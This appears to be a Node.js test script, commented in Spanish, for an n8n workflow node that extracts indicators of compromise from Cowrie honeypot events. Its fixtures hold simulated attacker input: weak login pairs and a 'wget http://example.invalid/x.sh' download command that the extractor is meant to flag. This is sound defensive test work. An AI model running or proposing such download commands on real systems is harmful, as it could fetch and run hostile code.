// Prueba del nodo Code "Extraer IoCs" de n8n/workflows/ioc-extractor.json sin n8n ni Docker.
// Uso: node scripts/test_extractor_codenode.js [ruta-al-workflow.json]
// Compara el comportamiento con entradas vacías y con eventos reales de ejemplo.
const fs = require('fs');
const path = process.argv[2] || 'n8n/workflows/ioc-extractor.json';
const wf = JSON.parse(fs.readFileSync(path, 'utf8'));
const src = wf.nodes.find(n => n.name === 'Extraer IoCs').parameters.jsCode;
const run = (items) => new Function('items', src)(items);
let fallos = 0;
const check = (nombre, cond, detalle) => { console.log((cond ? 'OK   ' : 'FALLA') + ' ' + nombre + (detalle ? ' -> ' + detalle : '')); if (!cond) fallos++; };

// 1) Sin eventos pendientes: n8n entrega [] o un ítem vacío
check('entrada [] no produce ítems', run([]).length === 0);
check('entrada [{json:{}}] (ítem vacío) no produce ítems', run([{ json: {} }]).length === 0);
check('entrada [{json:{id:null}}] no produce ítems', run([{ json: { id: null } }]).length === 0);

// 2) Eventos de una sesión (13 eventos del guion): ip solo en session.connect, credenciales con usuario+clave, comando con patrón
const ev = [
  { id: 101, eventid: 'cowrie.session.connect', src_ip: '172.19.0.5' },
  { id: 102, eventid: 'cowrie.session.params' },
  { id: 103, eventid: 'cowrie.login.failed', username: 'admin', password: '123456' },
  { id: 104, eventid: 'cowrie.login.success', username: 'admin', password: 'test123' },
  { id: 105, eventid: 'cowrie.command.input', input: 'whoami' },
  { id: 106, eventid: 'cowrie.command.input', input: 'wget http://example.invalid/x.sh' },
  { id: 107, eventid: 'cowrie.session.closed' }
].map(json => ({ json }));
const out = run(ev);
check('7 eventos válidos producen 7 ítems', out.length === 7, String(out.length));
check('session.connect produce indicador ip', out[0].json.produced_ioc === true && out[0].json.values_sql.includes("'ip'"));
check('session.params no produce indicador', out[1].json.produced_ioc === false && out[1].json.values_sql === '(NULL,NULL,NULL,NULL)');
check('login produce credential', out[3].json.values_sql.includes("'credential', 'admin:test123'"));
check('whoami no produce comando', out[4].json.produced_ioc === false);
check('wget produce command', out[5].json.values_sql.includes("'command'"));
check('todos los ítems traen event_id', out.every(o => o.json.event_id !== undefined));
check('pairedItem declarado', out.every((o, i) => o.pairedItem && o.pairedItem.item === i));

// 3) Mezcla: un ítem vacío entre eventos válidos se ignora
const mezcla = run([{ json: {} }, { json: { id: 201, eventid: 'cowrie.login.failed', username: 'a', password: 'b' } }]);
check('ítem vacío mezclado se ignora', mezcla.length === 1 && mezcla[0].json.event_id === 201);
console.log(fallos === 0 ? '\nTodas las pruebas pasaron' : '\n' + fallos + ' prueba(s) fallaron');
process.exit(fallos ? 1 : 0);
